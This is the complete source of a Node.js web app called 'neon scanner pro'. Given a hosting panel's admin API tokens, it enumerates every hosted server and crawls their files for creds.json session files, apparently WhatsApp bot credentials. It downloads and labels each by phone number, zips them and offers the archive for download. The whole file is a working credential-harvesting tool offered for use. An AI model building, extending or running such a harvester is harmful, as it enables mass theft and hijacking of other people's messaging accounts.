const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const archiver = require('archiver');
const WebSocket = require('ws');
const http = require('http');
const multer = require('multer');
const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });
const port = process.env.SERVER_PORT || 3000;
app.use(express.json());
app.use(cors());
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ extended: true, limit: '500mb' }));
app.use(express.static(path.join(__dirname, 'public')));
const storage = multer.memoryStorage();
const upload = multer({ storage });
const activeScans = new Map();
function broadcast(data) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}
wss.on('connection', (ws) => {
    ws.on('message', (message) => {
        try {
            const data = JSON.parse(message);
            if (data.type === 'subscribe_scan') {
                ws.scanId = data.scanId;
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });    
    ws.on('close', () => {
        console.log('client disconnected');
    });
});
function createScanner(domain, plta, pltc, opts = {}) {
    const state = {
        domain: String(domain || '').replace(/\/+$/, ''),
        plta: String(plta || ''),
        pltc: String(pltc || ''),
        foundFiles: [],
        scanStats: { serversScanned: 0, filesFound: 0, errors: 0 },
        concurrency: Number(opts.concurrency || 4),
        retryLimit: Number(opts.retryLimit || 3),
        retryDelayBase: Number(opts.retryDelayBase || 500),
        dryRun: Boolean(opts.dryRun || false),
        scanId: opts.scanId,
        onProgress: opts.onProgress || (() => {})
    };
    const dirs = ['session', 'sessions', 'sesion', 'sesi', 'sessi'];
    const targets = ['creds.json'];
    const deviceRegex = /device\d{4,}/i;    
    function axiosBuild(token) {
        return axios.create({
            baseURL: state.domain,
            headers: {
                Accept: 'application/json',
                Authorization: `Bearer ${token}`
            },
            timeout: 15000
        });
    }
    async function requestWithRetry(instance, url, config = {}, attempt = 0) {
        try {
            return await instance.get(url, config);
        } catch (e) {
            if (attempt >= state.retryLimit) throw e;
            const delay = state.retryDelayBase * Math.pow(2, attempt);
            await new Promise(r => setTimeout(r, delay));
            return requestWithRetry(instance, url, config, attempt + 1);
        }
    }
    async function listFiles(identifier, directory = '/') {
        if (!identifier) return [];
        const inst = axiosBuild(state.pltc);
        try {
            const res = await requestWithRetry(inst, `/api/application/servers/${identifier}/files/list`, {
                params: { directory },
                timeout: 15000
            });
            return Array.isArray(res.data?.data) ? res.data.data : [];
        } catch (e) {
            state.scanStats.errors++;
            state.onProgress('error', { error: e.message, server: identifier });
            return [];
        }
    }
    async function scanDirectory(identifier, dir = '/') {
        const queue = [{ id: identifier, dir }];
        let processed = 0;
        let total = 1;        
        while (queue.length) {
            const batch = queue.splice(0, state.concurrency);
            await Promise.all(batch.map(async task => {
                const files = await listFiles(task.id, task.dir);
                total += files.length;                
                for (const item of files) {
                    processed++;
                    const progress = Math.round((processed / total) * 100);
                    state.onProgress('progress', { 
                        progress, 
                        server: identifier,
                        current: item.attributes?.name 
                    });                    
                    const name = item.attributes?.name || item.name || '';
                    if (!name) continue;
                    const itemPath = (task.dir === '/' ? '' : task.dir) + '/' + name;
                    const normalized = itemPath.replace(/\/+/g, '/').replace(/^\//, '');
                    const mime = item.attributes?.mime || item.attributes?.type || item.type || '';
                    let isDir = mime === 'inode/directory' || mime === 'dir' || mime === 'directory';
                    if (!isDir && dirs.includes(name.toLowerCase())) {
                        try {
                            const test = await listFiles(task.id, normalized);
                            if (Array.isArray(test) && test.length > 0) isDir = true;
                        } catch {}
                    }
                    if (!isDir) {
                        const lower = name.toLowerCase();
                        if (targets.some(t => lower.includes(t))) {
                            state.foundFiles.push({
                                path: normalized,
                                name,
                                server: task.id,
                                size: item.attributes?.size || 0,
                                modified: item.attributes?.modified_at || null
                            });
                            state.scanStats.filesFound++;
                            state.onProgress('file_found', { 
                                file: normalized, 
                                server: task.id,
                                totalFound: state.scanStats.filesFound 
                            });
                        }
                        continue;
                    }
                    const pathParts = normalized.split('/');
                    const matchedDevice = pathParts.find(p => deviceRegex.test(p));
                    if (matchedDevice) {
                        const possibleCredPath = normalized.replace(/\/+$/,'') + '/creds.json';
                        state.foundFiles.push({
                            path: possibleCredPath,
                            name: 'creds.json',
                            server: task.id,
                            size: 0,
                            matchedDevice
                        });
                        state.scanStats.filesFound++;
                        state.onProgress('file_found', { 
                            file: possibleCredPath, 
                            server: task.id,
                            totalFound: state.scanStats.filesFound 
                        });
                        continue;
                    }
                    queue.push({ id: task.id, dir: normalized });
                }
            }));
        }
    }
    async function getFileContent(identifier, filePath) {
        if (!identifier || !filePath) return null;
        const inst = axiosBuild(state.pltc);
        try {
            const down = await requestWithRetry(inst, `/api/application/servers/${identifier}/files/download`, {
                params: { file: filePath },
                timeout: 15000
            });
            const url = down.data?.attributes?.url;
            if (!url) return null;
            if (state.dryRun) return { dry: true, url };
            const res = await axios.get(url, { responseType: 'arraybuffer', timeout: 20000 });
            const buf = Buffer.from(res.data);
            try {
                return JSON.parse(buf.toString());
            } catch {
                return buf.toString('utf8');
            }
        } catch {
            state.scanStats.errors++;
            return null;
        }
    }

    async function fetchAllServers() {
        if (!state.plta) return [];
        const inst = axiosBuild(state.plta);
        let page = 1;
        const all = [];
        while (true) {
            try {
                state.onProgress('fetch_servers', { page });
                const res = await requestWithRetry(inst, `/api/application/servers`, {
                    params: { page },
                    timeout: 15000
                });
                const data = res.data?.data;
                if (!Array.isArray(data) || data.length === 0) break;
                all.push(...data);
                const totalPages = res.data?.meta?.pagination?.total_pages || 0;
                if (totalPages && page >= totalPages) break;
                page++;
            } catch (e) {
                state.scanStats.errors++;
                break;
            }
        }
        return all;
    }

    async function scanAllServers(saveDir = './data') {
        try {
            if (!state.plta || !state.pltc) return { success: false, error: 'tokens_missing', stats: state.scanStats };
            state.foundFiles = [];
            state.scanStats = { serversScanned: 0, filesFound: 0, errors: 0 };
            
            state.onProgress('start', { message: 'Fetching servers list...' });
            const servers = await fetchAllServers();
            state.scanStats.serversScanned = servers.length;
            
            state.onProgress('servers_fetched', { count: servers.length });
            
            for (let i = 0; i < servers.length; i++) {
                const srv = servers[i];
                const identifier = srv.attributes?.identifier || srv.identifier || srv.id;
                
                state.onProgress('scan_server', { 
                    server: identifier, 
                    current: i + 1, 
                    total: servers.length 
                });
                
                await scanDirectory(identifier, '/');
            }
            
            if (state.dryRun) {
                state.onProgress('complete', { dryRun: true });
                return { success: true, stats: state.scanStats, totalFound: state.foundFiles.length, results: state.foundFiles };
            }
            
            await fs.promises.mkdir(saveDir, { recursive: true });
            const results = [];
            
            state.onProgress('download_files', { count: state.foundFiles.length });
            
            for (let i = 0; i < state.foundFiles.length; i++) {
                const file = state.foundFiles[i];
                state.onProgress('download_file', { 
                    file: file.path, 
                    current: i + 1, 
                    total: state.foundFiles.length 
                });
                
                const content = await getFileContent(file.server, file.path);
                if (!content) continue;
                let nomor = null;
                try {
                    const rawId = content?.me?.id;
                    if (rawId) nomor = String(rawId).split(':')[0].split('@')[0];
                } catch {}
                if (!nomor) {
                    const matched = file.matchedDevice || String(file.name).match(/\d{6,}/);
                    nomor = matched ? matched[0] : Math.random().toString(36).slice(2, 8);
                }
                const folder = path.join(saveDir, `device${nomor}`);
                await fs.promises.mkdir(folder, { recursive: true });
                const savePath = path.join(folder, 'creds.json');
                const payload = typeof content === 'string' ? content : JSON.stringify(content, null, 2);
                await fs.promises.writeFile(savePath, payload, 'utf8');
                results.push({ server: file.server, saved_path: savePath, path: file.path });
            }
            
            state.onProgress('complete', { results: results.length });
            return { success: true, stats: state.scanStats, totalFound: state.foundFiles.length, results };
        } catch (e) {
            state.onProgress('error', { error: e.message });
            return { success: false, error: e && e.message ? e.message : String(e), stats: state.scanStats };
        }
    }

    return {
        scanAllServers
    };
}

function sanitizeZipName(domain) {
    const noProto = String(domain || '').replace(/^https?:\/\//i, '');
    return noProto.replace(/[\/\\:?<>|*"']/g, '').replace(/\.+/g, '.').slice(0, 200) || 'site';
}

function zipFolder(sourceDir, outPath) {
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(outPath);
        const archive = archiver('zip', { zlib: { level: 9 } });
        output.on('close', () => resolve());
        archive.on('error', err => reject(err));
        archive.pipe(output);
        archive.directory(sourceDir, false);
        archive.finalize();
    });
}

async function removeFolder(p) {
    try {
        await fs.promises.rm(p, { recursive: true, force: true });
    } catch {}
}


app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/scan', async (req, res) => {
    const { domain, plta, pltc, mode, concurrency, scanId } = req.body;
    
    if (!domain || !plta || !pltc) {
        return res.status(400).json({ 
            success: false, 
            error: 'Domain, PLTA, and PLTC tokens are required' 
        });
    }
    activeScans.set(scanId, { status: 'running', startTime: new Date() });    
    const scanner = createScanner(domain, plta, pltc, { 
        concurrency: concurrency || 4,
        retryLimit: 3,
        dryRun: false,
        scanId: scanId,
        onProgress: (type, data) => {
            broadcast({
                type: 'scan_progress',
                scanId: scanId,
                progressType: type,
                data: data,
                timestamp: new Date().toISOString()
            });
        }
    });
    
    try {
        const tmpDir = path.join(__dirname, 'scans', scanId);
        const result = await scanner.scanAllServers(tmpDir);        
        if (result.success && Array.isArray(result.results) && result.results.length > 0) {
            const zipName = sanitizeZipName(domain) + '_' + scanId + '.zip';
            const zipPath = path.join(__dirname, 'downloads', zipName);            
            await fs.promises.mkdir(path.dirname(zipPath), { recursive: true });
            await zipFolder(tmpDir, zipPath);
            await removeFolder(tmpDir);            
            result.downloadUrl = `/download/${zipName}`;
        }
        activeScans.set(scanId, { 
            status: 'completed', 
            endTime: new Date(),
            result: result 
        });        
        res.json(result);
    } catch (error) {
        console.error('Scan error:', error);
        activeScans.set(scanId, { 
            status: 'failed', 
            endTime: new Date(),
            error: error.message 
        });        
        res.status(500).json({ 
            success: false, 
            error: 'Internal server error: ' + error.message 
        });
    }
});
app.get('/download/:filename', (req, res) => {
    const filename = req.params.filename;
    const filePath = path.join(__dirname, 'downloads', filename);
    
    if (!fs.existsSync(filePath)) {
        return res.status(404).json({ error: 'File not found' });
    }   
    res.download(filePath, filename, (err) => {
        if (err) {
            console.error('Download error:', err);
            res.status(500).json({ error: 'Download failed' });
        }
    });
});
app.get('/api/scans/:scanId', (req, res) => {
    const scanId = req.params.scanId;
    const scan = activeScans.get(scanId);    
    if (!scan) {
        return res.status(404).json({ error: 'Scan not found' });
    }    
    res.json(scan);
});
setInterval(() => {
    const now = Date.now();
    const maxAge = 2 * 60 * 60 * 1000;
    for (const [scanId, scan] of activeScans.entries()) {
        if (scan.endTime && (now - new Date(scan.endTime).getTime() > maxAge)) {
            activeScans.delete(scanId);
        }
    }
    const downloadsDir = path.join(__dirname, 'downloads');
    if (fs.existsSync(downloadsDir)) {
        fs.readdir(downloadsDir, (err, files) => {
            if (err) return;
            
            files.forEach(file => {
                const filePath = path.join(downloadsDir, file);
                fs.stat(filePath, (err, stats) => {
                    if (err) return;
                    if (now - stats.mtime.getTime() > maxAge) {
                        fs.unlink(filePath, () => {});
                    }
                });
            });
        });
    }
}, 30 * 60 * 1000);

server.listen(port, () => {
    console.log(`neon scanner pro running at http://localhost:${port}`);
});